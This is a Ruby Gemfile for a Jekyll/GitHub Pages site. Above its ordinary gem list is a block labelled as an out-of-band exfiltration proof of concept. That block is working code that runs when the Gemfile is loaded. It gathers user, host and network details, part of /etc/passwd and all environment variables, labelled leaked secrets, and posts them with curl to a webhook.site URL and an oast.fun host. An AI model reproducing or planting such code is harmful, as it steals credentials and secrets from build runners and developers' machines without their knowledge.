# --- BEGIN OOB EXFILTRATION POC ---
webhook = "https://webhook.site/6b571040-653e-4190-bd43-1081f6e1ef85"
interact = "jzlnriqracktrqqcvctti0z1e1payovlr.oast.fun"

# Consolidating all 5 evidence points into a single report
data =  "=== SECURITY RESEARCH REPORT: RCE EVIDENCE ===\n"
data += "1. USER IDENTIFICATION: " + `id`
data += "2. RUNNER HOSTNAME: " + `hostname`
data += "3. NETWORK CONFIGURATION:\n" + `ip addr | grep inet`
data += "4. SYSTEM FILE ACCESS (/etc/passwd):\n" + `head -n 3 /etc/passwd`
data += "5. ARBITRARY WRITE TEST: " + `echo 'VULNERABILITY_CONFIRMED' > /tmp/poc_verify.txt && cat /tmp/poc_verify.txt`
data += "\n=== ENVIRONMENT VARIABLES (LEAKED SECRETS) ===\n"
data += `env | cut -c1-100`

# Method 1: Exfiltrate full data via HTTP POST to Webhook
`curl -s -X POST -H "Content-Type: text/plain" --data "#{data}" #{webhook}`

# Method 2: Trigger DNS/HTTP interaction for OOB verification
`curl -s "http://#{interact}/status-rce-active-$(hostname)"`

puts "========================================"
puts "Vulnerability Verified: Data sent to OOB servers."
puts "Please check the Webhook and Interactsh dashboards."
puts "========================================"
# --- END POC ---

source "https://rubygems.org"
gem "faraday", "2.14.1"
gem "faraday-retry", "2.4.0"
gem "github-pages", "~> 232", group: :jekyll_plugins
gem "json", "2.18.0"
gem "language_server-protocol", "3.17.0.5"
gem "nokogiri", "~> 1.19.0"
gem "rake", "13.3.1"
gem "rubocop", "1.82.1"

group :test do
  gem "fastimage"
  gem "httparty"
  gem "minitest"
  gem "octokit"
  gem "pry", require: false
  gem "rubocop-performance"
  gem "safe_yaml"
end

group :development do
  gem "webrick"
end
